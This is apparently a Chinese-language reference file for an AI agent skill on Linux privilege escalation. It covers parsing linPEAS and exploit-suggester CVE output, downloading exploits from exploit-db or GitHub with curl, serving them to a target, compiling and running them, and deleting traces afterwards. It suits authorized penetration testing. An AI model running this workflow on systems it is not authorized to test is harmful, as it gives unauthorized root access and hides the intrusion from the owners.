# Exploit 动态匹配参考

本 skill 不预设任何固定 CVE/exploit，所有漏洞匹配在探测目标后动态完成。本文档说明如何解读探测结果并获取对应 exploit。

## 探测工具

| 工具 | 说明 | 用法 |
|------|------|------|
| **linPEAS** | 全面系统枚举 + 内置 CVE 匹配 | `./linpeas.sh` |
| **LES (linux-exploit-suggester)** | 内核漏洞快速匹配 | `./les.sh` 或 `perl les2.pl` |

## 解析探测结果

### linPEAS 输出中的 CVE

linPEAS 内置了内核漏洞匹配引擎，输出中会有类似内容：

```
╔══════════╣ Kernel Exploit Registry (T1068)
═╣ Kernel release ............... 3.13.0-32-generic
CVE: CVE-2015-1328 | Name: overlayfs | ...
CVE: CVE-2016-5195 | Name: dirtycow | ...
```

用以下命令提取：
```bash
grep -iE 'CVE-[0-9]{4}' /tmp/target_peas.txt | sort -u
```

### exploit-suggester 输出

LES 输出格式：

```
[+] [CVE-2015-1328] overlayfs
   Details: http://www.exploit-db.com/exploits/37292
   Kernel: 3.13.0 - 3.19.0

[+] [CVE-2016-5195] dirtycow
   Details: http://www.exploit-db.com/exploits/40616
   Kernel: 2.6.22 - 4.8.3
```

## 下载 Exploit

### 从 exploit-db

```bash
# exploit-db ID (从 suggetser 输出中获取)
ID=37292

# 下载到本机 HTTP 目录
curl -sL -o /tmp/poc.c "https://www.exploit-db.com/raw/$ID"

# 上传到目标机
# 通过 HTTP 服务: http://<本机IP>:8888/poc.c
```

### 从 GitHub

部分 exploit 在 GitHub 上有更新版本：

```bash
# 搜索公开 PoC
git clone https://github.com/<user>/<repo>.git

# 或通过 searchsploit（如果 kali 已安装）
searchsploit -m <exploit-path>
```

## 编译 Exploit

```bash
# 标准 C
gcc exploit.c -o exploit
./exploit

# 需要 pthread + crypt（如 Dirty COW）
gcc -pthread exploit.c -o exploit -lcrypt
./exploit

# 需要静态编译
gcc -static exploit.c -o exploit
./exploit

# Python exploit
python exploit.py

# Perl exploit
perl exploit.pl
```

## 提权后清理

```bash
# 恢复被修改的系统文件
# 如果 Dirty COW 改过 /etc/passwd:
cp /tmp/passwd.bak /etc/passwd

# 清理临时文件
rm -f /tmp/linpeas.sh /tmp/les.sh /tmp/exploit* /tmp/poc* /tmp/peas-out.txt
```

## 参考链接

- https://www.exploit-db.com — 搜索 exploit
- https://nvd.nist.gov — CVE 详情
- https://github.com/peass-ng/PEASS-ng — linPEAS
- https://github.com/mzet-/linux-exploit-suggester — exploit-suggester
